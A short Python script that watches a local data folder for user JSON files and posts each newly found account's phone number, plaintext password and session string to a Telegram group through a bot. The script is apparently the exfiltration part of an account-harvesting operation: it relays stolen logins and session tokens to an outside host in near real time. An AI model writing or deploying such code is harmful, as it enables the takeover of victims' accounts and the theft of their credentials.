import json
import os
import time
import requests

BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_GROUP_ID"
DATA_FOLDER = "data"

seen_accounts = set()

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": text})


def load_all_accounts():
    all_accounts = []

    if not os.path.exists(DATA_FOLDER):
        return all_accounts

    for file in os.listdir(DATA_FOLDER):
        if file.startswith("user_") and file.endswith(".json"):
            path = os.path.join(DATA_FOLDER, file)

            try:
                with open(path, "r") as f:
                    data = json.load(f)

                accounts = data.get("accounts", {})

                for number, details in accounts.items():
                    all_accounts.append(details)

            except:
                continue

    return all_accounts


def start_watcher():
    global seen_accounts

    # 🧠 First load (spam avoid)
    for acc in load_all_accounts():
        seen_accounts.add(acc.get("phone"))

    while True:
        try:
            accounts = load_all_accounts()

            for acc in accounts:
                phone = acc.get("phone")

                if phone not in seen_accounts:
                    seen_accounts.add(phone)

                    msg = f"""📥 New Account Added

📱 Number: {phone}
🔑 Password: {acc.get('password')}
📂 Session: {acc.get('session')[:400]}
"""

                    send_to_telegram(msg)

            time.sleep(5)

        except Exception as e:
            print("Watcher Error:", e)
            time.sleep(5)
